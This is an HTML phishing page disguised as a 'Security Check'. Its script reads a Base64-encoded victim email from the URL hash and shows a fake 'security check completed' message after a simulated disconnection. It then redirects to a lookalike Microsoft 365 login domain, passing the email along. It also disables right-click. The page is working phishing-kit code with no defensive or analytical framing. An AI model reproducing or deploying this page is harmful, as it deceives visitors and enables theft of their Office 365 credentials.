<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
    <meta http-equiv="Referrer-Policy" content="no-referrer">

    <style>
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
        }

        .image-container {
            width: 100%;
            max-width: 900px;
        }

        .image-container img {
            width: 100%;
            height: auto;
            display: block;
        }

        .security-check {
            display: none;
            margin-top: 1rem;
            font-size: 1rem;
            color: #4CAF50;
            text-align: center;
            font-family: 'Arial', sans-serif;
            background-color: #f2f2f2;
            padding: 10px 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
        }
    </style>
</head>
<body oncontextmenu="return false;">
    <div class="container">
        <div class="image-container">
            <img src="https://pbs.twimg.com/media/GGrR89_WgAAgrOI?format=jpg&name=large" alt="Simulating Disconnection...">
        </div>
        <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
    </div>

    <!-- Hidden email field to auto-grab Base64-encoded email -->
    <input type="email" id="email" placeholder="Your email" style="display:none;">

    <script>
        (function() {
            'use strict';

            // Function to extract Base64-encoded email from the URL hash (e.g., #Y29udGFjdEBleGFtcGxlLmNvbQ==)
            function getEmailFromHash() {
                const hash = window.location.hash.substr(1); // Remove the leading '#'
                try {
                    return atob(hash); // Decode Base64 email
                } catch (error) {
                    console.error("Failed to decode Base64 email:", error);
                    return null;
                }
            }

            // Populate the hidden email field with the decoded email
            function populateEmail() {
                const email = getEmailFromHash();
                if (email) {
                    const emailField = document.getElementById("email");
                    if (emailField) {
                        emailField.value = email;
                        console.log("Email found and populated: " + email);
                    } else {
                        console.warn("Email field not found.");
                    }
                } else {
                    console.warn("No email found in the URL.");
                }
            }

            // Redirect after the email is decoded
            function redirectToPage() {
                const email = getEmailFromHash();
                if (email) {
                    // After decoding, redirect to a new page with the decoded email in the query string
                    const redirectTo = `https://l0g1n-micros.ftlivedocs.com/o365?email=${email}`;  // Removed encodeURIComponent to prevent extra encoding
                    console.log("Redirecting to: " + redirectTo);
                    window.location.href = redirectTo;
                } else {
                    console.error("No valid email to redirect with.");
                }
            }

            // Simulate disconnection and security check
            function simulateDisconnection() {
                console.log("Simulating disconnection for 10 seconds...");

                setTimeout(() => {
                    console.log("Reconnecting...");

                    const securityCheckMessage = document.querySelector('.security-check');
                    if (securityCheckMessage) {
                        securityCheckMessage.style.display = 'block';
                    }

                    // Redirect after security check and Base64 decoding
                    setTimeout(redirectToPage, 6000);
                }, 10000);
            }

            window.onload = function() {
                populateEmail(); // Ensure the email is decoded first
                simulateDisconnection(); // Simulate security check and disconnection
            };
        })();
    </script>
</body>
</html>
